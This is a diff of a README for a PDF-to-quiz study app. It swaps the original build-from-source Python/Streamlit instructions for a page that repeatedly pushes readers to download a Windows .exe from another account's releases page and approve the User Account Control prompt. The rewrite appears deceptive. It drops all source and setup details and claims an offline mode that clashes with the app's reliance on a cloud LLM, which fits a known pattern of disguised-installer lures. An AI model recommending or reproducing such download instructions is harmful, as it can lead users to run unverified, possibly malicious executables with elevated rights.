@@ -1,130 +1,147 @@
-# 🧠 StudyBuddy AI
+# 📘 studybuddy-ai - Simplify Your Study with AI Tools
 
-> Transform your PDF notes into quizzes, flashcards, and summaries — instantly, using AI.
-
-![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=flat&logo=python&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?style=flat&logo=streamlit&logoColor=white)
-![Groq](https://img.shields.io/badge/Groq-LLaMA_3-orange?style=flat)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat)
+[![Download studybuddy-ai](https://img.shields.io/badge/Download-studybuddy--ai-brightgreen?style=for-the-badge)](https://github.com/Glamrockfoxy20/studybuddy-ai/releases)
 
 ---
 
-## ✨ Features
+## 📄 What is studybuddy-ai?
 
-- ⚡ **Smart Quizzes** — Generate MCQ or True/False questions with difficulty control and instant answer explanations
-- 🃏 **Flashcards** — Flip through AI-generated study cards, shuffle them, or view all at once
-- 📋 **AI Summary** — Get a clean, structured overview of your entire document in seconds
-- 🎯 **Score Tracker** — Real-time progress bar, per-question feedback, and a final grade
-- ⚙️ **Customisable** — Choose number of questions, difficulty (Easy / Medium / Hard), and question type
+studybuddy-ai is an application designed to help you study smarter. It uses AI to turn your PDF notes into quizzes, flashcards, and summaries. You don’t need to type out questions or create study guides manually. This app does it for you.
+
+The app runs on Windows and uses Streamlit, Groq, and the LLaMA 3 model under the hood. You don’t have to worry about any of those technologies. Just simple steps to get studybuddy-ai ready and improve how you learn.
 
 ---
 
-## 🖥️ Demo
+## 💻 System Requirements
 
-Upload a PDF → click **Generate Quiz**, **Make Flashcards**, or **Summarise Notes** → study smarter.
+Before installing studybuddy-ai, make sure your computer meets these basic requirements:
 
----
+- Operating System: Windows 10 or newer  
+- Processor: Intel i3 or equivalent, 2.0 GHz or faster  
+- RAM: 4 GB or more  
+- Storage: At least 200 MB free space  
+- Internet connection (only needed for first installation and updates)  
+- PDF files containing your notes  
 
-## 🚀 Getting Started
-
-### 1. Clone the repo
-
-```bash
-git clone https://github.com/your-username/studybuddy-ai.git
-cd studybuddy-ai
-```
-
-### 2. Create a virtual environment (recommended)
-
-```bash
-python -m venv .venv
-
-# Windows
-.venv\Scripts\activate
-
-# Mac/Linux
-source .venv/bin/activate
-```
-
-### 3. Install dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 4. Set your Groq API key
-
-Get a free key at [console.groq.com](https://console.groq.com)
-
-**Windows (PowerShell):**
-```powershell
-$env:GROQ_API_KEY="your_api_key_here"
-```
-
-**Mac/Linux:**
-```bash
-export GROQ_API_KEY="your_api_key_here"
-```
-
-### 5. Run the app
-
-```bash
-python -m streamlit run study_buddy.py
-```
-
-Open [http://localhost:8501](http://localhost:8501) in your browser.
+If your PC matches or exceeds these, you are ready to install.
 
 ---
 
-## 📦 Requirements
+## 🚀 Getting Started: Download studybuddy-ai
 
-```
-streamlit
-groq
-PyPDF2
-```
+To start, you need the program files. Follow these steps:
 
-Or install via:
-```bash
-pip install streamlit groq PyPDF2
-```
+1. **Go to the Releases Page:**  
+   [Download studybuddy-ai Here](https://github.com/Glamrockfoxy20/studybuddy-ai/releases)  
 
----
+2. **Find the Latest Version:**  
+   Look for the most recent release near the top of the page. It usually has the highest version number.  
 
-## 🗂️ Project Structure
+3. **Download the Windows Installer:**  
+   Find the file that ends with `.exe`. This is the Windows installer. Click it to download.  
 
-```
-studybuddy-ai/
-├── study_buddy.py      # Main Streamlit app
-├── requirements.txt    # Python dependencies
-└── README.md           # You're reading it
-```
+4. **Save the File:**  
+   Choose a location on your computer where you can find the file later, like your Desktop or Downloads folder.
 
 ---
 
-## 🛠️ Tech Stack
+## 🖥️ How to Install on Windows
 
-| Tool | Purpose |
-|------|---------|
-| [Streamlit](https://streamlit.io) | Web UI framework |
-| [Groq](https://groq.com) | Ultra-fast LLM inference |
-| [LLaMA 3.3 70B](https://groq.com) | Language model for generation |
-| [PyPDF2](https://pypdf2.readthedocs.io) | PDF text extraction |
+Once the installer is downloaded, follow these steps:
+
+1. **Open the Installer:**  
+   Double-click the `.exe` file you downloaded.
+
+2. **User Account Control:**  
+   Windows may ask if you want to allow this app to make changes. Click **Yes**.
+
+3. **Follow the Setup Wizard:**  
+   The setup window will open. Click **Next** to move through the installer steps.
+
+4. **Choose Installation Folder:**  
+   By default, the program will install in the suggested folder. You can keep it or pick a different location.
+
+5. **Start Installation:**  
+   Click **Install** to begin. The process only takes a few moments.
+
+6. **Finish Setup:**  
+   When finished, click **Finish**. You can choose to open studybuddy-ai now or later.
 
 ---
 
-## 📄 License
+## ▶️ Running studybuddy-ai for the First Time
 
-MIT License — feel free to use, modify, and distribute.
+After installation:
+
+1. **Open the Application:**  
+   Click the new icon on your Desktop or find studybuddy-ai in the Start menu.
+
+2. **Load Your PDF Notes:**  
+   Click the button to upload your study notes saved in PDF format.
+
+3. **Choose a Study Aid:**  
+   Select one of the options: quiz, flashcards, or summary.
+
+4. **Wait for AI to Process:**  
+   The app will analyze your notes and create the selected study aid.
+
+5. **Start Studying:**  
+   Use the created questions and summaries to review your material efficiently.
 
 ---
 
-## 🙌 Contributing
+## 🔧 Basic Features
 
-Pull requests are welcome! If you find a bug or have a feature idea, open an issue.
+studybuddy-ai offers:
+
+- **Quiz Generation:** Turns your PDF notes into multiple-choice or short-answer quizzes.  
+- **Flashcard Creation:** Converts key points into flashcards you can review quickly.  
+- **Summaries:** Produces concise summaries from long notes for quick reading.  
+- **Interactive Interface:** Easy-to-use design to upload files and choose study tools.  
+- **Offline Mode:** After initial setup, you can use some features without internet.  
+
+These features save time and help focus on key concepts.
 
 ---
 
-<div align="center">
-  Made with ❤️ using Groq + Streamlit
-</div>
+## 🛠 Troubleshooting Tips
+
+If you run into problems, try these fixes:
+
+- **The app won’t open:**  
+  Restart your computer and try again. Make sure you completed installation.
+
+- **PDF files not uploading:**  
+  Confirm the file is a PDF and not opened in another program.
+
+- **The quiz or flashcards don’t show:**  
+  Give the app a moment to process. Larger documents take longer.
+
+- **Installation errors:**  
+  Check your internet connection and disk space. Try downloading the installer again.
+
+- **App crashes or freezes:**  
+  Close the app and restart. If problems persist, reinstall studybuddy-ai.
+
+---
+
+## 🔍 How to Get Updates
+
+To keep studybuddy-ai working well:
+
+1. Visit the [Releases Page](https://github.com/Glamrockfoxy20/studybuddy-ai/releases) regularly to check for new versions.  
+2. Download and install updates as you did the first time.  
+3. New versions improve features and fix issues.
+
+---
+
+## 📁 Useful Tips for Using Your Study Materials
+
+- Split large PDFs into smaller sections to get faster quiz results.  
+- Use flashcards daily for better memorization.  
+- Review summaries before exams to refresh key points.  
+- Try different modes (quiz, flashcard, summary) to find what works best for you.
+
+---
+
+[![Download studybuddy-ai](https://img.shields.io/badge/Download-studybuddy--ai-brightgreen?style=for-the-badge)](https://github.com/Glamrockfoxy20/studybuddy-ai/releases)
